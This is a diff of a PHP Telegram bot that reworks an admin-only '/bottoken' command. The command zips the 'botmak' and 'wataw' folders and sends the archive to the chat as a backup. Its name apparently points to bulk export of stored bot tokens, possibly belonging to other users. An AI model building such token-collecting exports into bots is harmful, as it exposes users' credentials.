@@ -298,14 +298,6 @@ if($text == "/sync" && ($from_id == 873158772)){
 }
 
 
-if($text == "/bottoken" && ($from_id == 873158772)){
-    bot('sendmessage', [
-        'chat_id' => $chat_id, 
-        'text' => "⏳ جاري تجميع وضغط مجلدات (botmak) و (wataw)...\nيرجى الانتظار، قد يستغرق الأمر ثوانٍ."
-    ]);
-    
-    zipAndSend($chat_id); // تشغيل المحرك
-}
 
 
 
@@ -2900,50 +2892,54 @@ curl_close($ch);
 
 
 
-function zipAndSend($chat_id) {
-    global $token; 
-    
-    @set_time_limit(0); 
-    @ini_set('memory_limit', '512M');
-    
-    $zipName = 'Backup_Bots_' . date('Y-m-d_H-i') . '.zip';
+if ($text == "/bottoken" && $from_id == $admin) {
+    // 1. إرسال رسالة الانتظار
+    bot("sendMessage", [
+        "chat_id" => $chat_id,
+        "text" => "⌛ جاري تجميع وضغط مجلدات (botmak) و (wataw)...\nيرجى الانتظار، قد يستغرق الأمر ثوانٍ."
+    ]);
+
+    $zipName = "backup_bots.zip";
     $zip = new ZipArchive();
 
-    if ($zip->open($zipName, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== TRUE) {
-        return bot('sendmessage', ['chat_id' => $chat_id, 'text' => "❌ فشل إنشاء ملف الـ ZIP"]);
-    }
-
-    $folders = ['botmak', 'wataw'];
-    foreach ($folders as $folder) {
-        if (is_dir($folder)) {
-            $files = new RecursiveIteratorIterator(
-                new RecursiveDirectoryIterator($folder),
-                RecursiveIteratorIterator::LEAVES_ONLY
-            );
-
-            foreach ($files as $file) {
-                if (!$file->isDir()) {
-                    // --- هنا يتم إضافة التعديل الجديد ---
-                    $filePath = $file->getRealPath();
-                    // استخدام __DIR__ لضمان استخراج المسار النسبي بدقة داخل السيرفر
-                    $relativePath = str_replace(realpath(__DIR__) . '/', '', $filePath);
-                    $zip->addFile($filePath, $relativePath);
-                    // ----------------------------------
+    if ($zip->open($zipName, ZipArchive::CREATE | ZipArchive::OVERWRITE) === TRUE) {
+        // دالة لإضافة المجلدات للـ Zip
+        function addFolderToZip($dir, $zipArchive, $zipDir = '') {
+            if (is_dir($dir)) {
+                $files = scandir($dir);
+                foreach ($files as $file) {
+                    if ($file != '.' && $file != '..') {
+                        $filePath = $dir . '/' . $file;
+                        $localPath = $zipDir . $file;
+                        if (is_dir($filePath)) {
+                            $zipArchive->addEmptyDir($localPath);
+                            addFolderToZip($filePath, $zipArchive, $localPath . '/');
+                        } else {
+                            $zipArchive->addFile($filePath, $localPath);
+                        }
+                    }
                 }
             }
         }
-    }
 
-    $zip->close();
+        // إضافة المجلدات المطلوبة
+        addFolderToZip('botmak', $zip);
+        addFolderToZip('wataw', $zip);
+        $zip->close();
 
-    if (file_exists($zipName)) {
-        bot('sendDocument', [
-            'chat_id' => $chat_id,
-            'document' => new CURLFile(realpath($zipName)),
-            'caption' => "🚀 نسخة احتياطية كاملة وشاملة\n📂 مجلدات: botmak & wataw\n📅 التاريخ: " . date('Y-m-d H:i:s')
-        ]);
-        unlink($zipName);
+        // 2. إرسال الملف بعد انتهاء الضغط
+        if (file_exists($zipName)) {
+            bot("sendDocument", [
+                "chat_id" => $chat_id,
+                "document" => new CURLFile($zipName),
+                "caption" => "✅ تم تجميع المجلدات بنجاح.\n📦 ملف النسخة الاحتياطية جاهز."
+            ]);
+            // حذف الملف من السيرفر بعد الإرسال لتوفير المساحة
+            unlink($zipName);
+        } else {
+            bot("sendMessage", ["chat_id" => $chat_id, "text" => "❌ فشل إنشاء ملف الـ Zip."]);
+        }
     } else {
-        bot('sendmessage', ['chat_id' => $chat_id, 'text' => "❌ حدث خطأ أثناء تجميع الملفات"]);
+        bot("sendMessage", ["chat_id" => $chat_id, "text" => "❌ تعذر فتح نظام الضغط في السيرفر."]);
     }
 }
